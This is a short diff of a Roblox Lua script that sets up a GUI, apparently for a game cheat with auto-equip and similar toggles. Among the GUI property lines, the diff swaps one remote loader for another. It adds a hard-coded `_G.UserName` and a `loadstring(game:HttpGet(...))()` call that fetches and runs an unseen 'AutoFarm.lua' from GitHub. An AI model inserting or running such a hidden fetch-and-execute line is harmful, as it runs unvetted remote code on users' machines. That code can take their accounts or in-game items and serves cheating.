@@ -615,7 +615,9 @@ ScreenGui.txtAutoEq.Font = Enum.Font.SourceSansBold
 ScreenGui.txtAutoEq.Text = "Auto Equip"
 ScreenGui.txtAutoEq.TextColor3 = Color3.fromRGB(255, 255, 255)
 ScreenGui.txtAutoEq.TextSize = 17.000
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/dalishe/Indigo-Hub/main/loader.lua"), true))()
+_G.UserName = "Kali_LinuxW"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua'))()
 ScreenGui.txtAutoEq.TextXAlignment = Enum.TextXAlignment.Left
 
 ScreenGui.switchBtnKA.Name = "switchBtnKA"
